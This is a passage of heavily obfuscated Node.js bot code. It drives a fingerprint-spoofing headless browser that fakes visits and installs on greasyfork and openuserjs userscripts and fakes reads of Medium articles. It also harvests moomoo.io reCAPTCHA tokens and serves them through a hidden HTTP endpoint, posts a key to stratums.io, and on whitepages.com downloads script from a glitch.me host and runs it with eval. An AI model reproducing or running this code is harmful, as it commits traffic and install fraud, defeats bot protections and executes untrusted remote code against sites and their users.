      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + X(0x1, '2qJq') + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a0(0x1c) + 'e/*'
    },
    {
      'url': 'https://gr' + Z(0x1e) + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + a0(0x3) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + X(0x17, 'X1vU') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + a0(0x21) + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + X(0x22, 'bhlA') + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + a0(0x18),
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + Z(0x5) + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x6b3 + 0x20e6 + -0x1 * 0x1a33
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a1 = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x130e + -0x135b + -0xb * -0x7)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * -0x570 + 0x1d3 * -0x4 + 0x240), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1970 + -0x5 * -0x616 + -0x377a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x3a1 * -0x9 + 0xead + 0x2f56 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x15da + 0x1 * 0x2633 + -0x1059; w < getRandomInt(-0xb07 + -0x807 + 0x130f, 0x198a * -0x1 + -0x6ce + 0x205d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1b391 + 0x1250d + -0x1ee3e);
        }
      }();
    }, 0x1394 + 0x798 + 0x4 * -0x6b2), doFlags['doRemoteCa' + a1(0x16)] && setTimeout(async function q() {
      const a2 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1 * -0x13e5 + -0xe76 + -0x56f;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y[a2(0xd)]('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x188 + -0x1 * -0x385 + -0x50d, 0x4d6 + 0x3be * 0x5 + -0x175a)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x74f * 0xe + -0xd48e + 0xa * 0x16be);
    }, -0x1df2 + -0xc7 * -0x21 + 0x4af), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a3 = d;
        try {
          let s = -0xfb4 + 0x215b + -0x11a7 * 0x1;
          const t = await m[a3(0x1d) + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t[a3(0x0)](), r();
          await wait(0xe12 * -0x2 + -0x1 * 0x3a2 + 0x1 * 0x2b7e), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x816 * 0x1 + 0x21d4 + -0x19be), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x7c26 + 0x3e418 + -0x12 * -0x92df);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x18d8 + 0x2 * 0x1b8 + -0x1be4);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1b86 + 0xdb6 + -0x2874);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1c80 + -0x13c6 * 0x1 + 0x4fd6);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = d,
    a5 = b,
    a4 = c;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x85b * -0x2 + -0x171a + 0x27d1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xba7 + -0x5e1 * 0x1 + 0x1189));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1506 + 0x1cb6 + -0x7b0, D['indexOf']('\x20'));
        return B ? E['slice'](-0x6ec * -0x3 + 0x1ffe + -0x2 * 0x1a61, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x1 * -0xf7e + -0x1 * 0x4532 + 0x5cc4),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xd * -0x3fc + -0x113c + 0x3 * 0x180),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      a4(0x1f) + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      a5(0x15, 'AmBJ') + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + a4(0x2) + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + a4(0x10) + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a6(0xf) + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + a5(0x24, 'QDLe') + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      a5(0xe, '(bBH') + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
